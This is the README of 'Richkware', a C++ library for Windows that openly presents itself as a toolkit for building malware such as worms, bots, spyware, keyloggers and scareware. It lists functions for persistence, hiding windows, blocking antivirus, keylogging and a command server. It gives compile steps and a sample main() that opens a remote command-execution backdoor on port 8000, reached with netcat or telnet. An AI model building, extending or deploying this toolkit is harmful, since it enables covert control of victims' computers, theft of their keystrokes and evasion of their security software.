# Richkware
Malware for Windows, written in C++.

##Description

It's a library of network and OS functions, that you can use to create a malware.
The compositions of these functions, according to different logics permit at the application 
to assume behaviors associable to the following types of malware:

- Virus
- Worms
- Bot
- Spyware
- Keylogger
- Scareware

##FUNCTIONS

###Network

- **StartServer**: start a server on an arbitrary port, to receive commands from the Internet, 
thus allowing to run commands or make changes to application state;
- **RawRequest**: send a request to a server;

###System

- **SaveValueReg** and **LoadValueReg**
- **SaveSession** and **LoadSession**: save the application state(encrypted) in the system;
- **IsAdmin** and **RequestAdminPrivileges**: check and require administrator privileges;
- **Persistance**: install itself permanently in the system.
- **StealthWindow**: hide applications;
- **OpenApp**: open arbitrary applications;
- **BlockApps** e **UnBlockApps**: block and Unblock applications (antivirus, ...);
- **Keylogger**

###Cryptography

- **EncryptDecrypt**

###Other

- **RandMouse**: move randomly the mouse cursor
- **Hibernation**: hibernate system;

##COMPILE

###Using g++ compiler (GCC, GNU Compiler Collection)

	g++ -O3 -c -o Richkware.o Richkware.cpp

	g++ -static-libgcc -static-libstdc++ -o Richkware.exe Richkware.o main.o -lws2_32 

###Using Microsoft C++ compiler (Visual Studio)
- C/C++ > Proprocessor > Proprocessor Definitions, add "\_CRT\_SECURE\_NO\_WARNINGS" 
- Linker > Input > Additional Dipendencies, add "Ws2_32.lib"


##REMOTELY COMMAND EXECUTION

Call function **StartServer** in the main, that starts server on port 8000.

	int main () {
		Richkware richkware ;
		richkware.StartServer ("8000");
		return 0;
	}

###Connect from Unix systems

In Unix systems, you can use **netcat**.

	nc <serverName> 8000

###Connect from Windows

In Windows, you can use **telnet**.

	telnet <serverName> 8000